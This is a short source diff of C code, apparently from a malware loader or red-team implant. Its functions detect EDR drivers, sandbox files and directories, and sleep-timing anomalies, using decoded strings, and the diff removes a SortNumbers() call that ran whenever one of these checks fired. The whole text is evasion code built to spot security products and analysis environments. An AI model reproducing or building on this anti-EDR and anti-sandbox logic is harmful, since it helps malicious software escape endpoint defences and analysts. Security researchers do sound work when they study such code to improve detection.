@@ -52,7 +52,6 @@ bool DetS()
             if (StrStrIA(findFileData.cFileName, decodedDriver))
             {
                 myDebug(DEBUG_INFO, "Detected EDR: %s", decodedDriver);
-                SortNumbers();
                 return true;
             }
         }
@@ -77,7 +76,6 @@ bool DetSl()
     if (elapsedMs < 9000.0 || elapsedMs > 11000.0)
     {
         myDebug(DEBUG_INFO, "Sleep timing anomaly detected: %f ms", elapsedMs);
-        SortNumbers();
         return true;
     }
     return false;
@@ -121,7 +119,6 @@ bool DetSBF()
         if (pPathFileExistsA(decodedPath))
         {
             myDebug(DEBUG_INFO, "Sandbox file detected!");
-            SortNumbers();
             free(decodedPath);
             return true;
         }
@@ -256,7 +253,6 @@ bool DetSBD()
         {
             myDebug(DEBUG_INFO, "Checks : %s", decodedPath);
             free(decodedPath);
-            SortNumbers();
             return true;
         }
         free(decodedPath);
@@ -271,7 +267,6 @@ bool DetSBD()
         {
             printf("Checks : %s", decodedPath);
             free(decodedPath);
-            SortNumbers();
             return true;
         }
         free(decodedPath);
